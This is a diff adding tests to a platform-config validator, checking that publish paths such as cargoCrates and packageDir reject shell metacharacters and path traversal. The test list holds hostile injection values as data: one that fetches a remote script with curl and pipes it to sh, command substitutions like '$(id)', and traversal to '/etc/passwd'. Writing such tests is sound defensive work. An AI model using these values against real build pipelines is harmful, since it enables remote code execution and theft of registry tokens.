@@ -451,3 +451,59 @@ build:
 		).toHaveLength(1);
 	});
 });
+
+describe("publish paths cannot inject shell", () => {
+	const pub = (over: Record<string, unknown>) =>
+		validatePlatformConfig({
+			build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
+			publish: { cargo: true, ...over },
+		});
+
+	it("🔴 REFUSES a crate path carrying shell metacharacters", () => {
+		// cargoCrates is interpolated UNQUOTED into `for c in …` in the generated
+		// publish script, so a metacharacter here is remote code execution in the
+		// publish Job — which holds CARGO_REGISTRY_TOKEN / NPM_TOKEN / PYPI_TOKEN.
+		for (const evil of [
+			"a; curl evil.sh | sh",
+			"$(id)",
+			"`id`",
+			"a|b",
+			"a&b",
+			"a\nb",
+			'a"b',
+			"a'b",
+			"a b",
+			"-flag",
+			"/etc/passwd",
+			"*",
+		]) {
+			expect(() => pub({ cargoCrates: [evil] })).toThrow(PlatformConfigError);
+		}
+	});
+
+	it("REFUSES upward traversal in a crate path", () => {
+		expect(() => pub({ cargoCrates: ["../../etc"] })).toThrow(
+			/traverse upward/,
+		);
+		expect(() => pub({ cargoCrates: ["a/../../b"] })).toThrow(
+			/traverse upward/,
+		);
+	});
+
+	it("REFUSES the same in packageDir", () => {
+		expect(() => pub({ packageDir: "../../etc" })).toThrow(/traverse upward/);
+		expect(() => pub({ packageDir: "a; id" })).toThrow(PlatformConfigError);
+	});
+
+	it("still accepts ordinary workspace crate paths", () => {
+		const cfg = pub({ cargoCrates: ["crates/core", "crates/cli", "."] });
+		expect(cfg.publish?.cargoCrates).toEqual([
+			"crates/core",
+			"crates/cli",
+			".",
+		]);
+		expect(pub({ packageDir: "packages/sdk" }).publish?.packageDir).toBe(
+			"packages/sdk",
+		);
+	});
+});
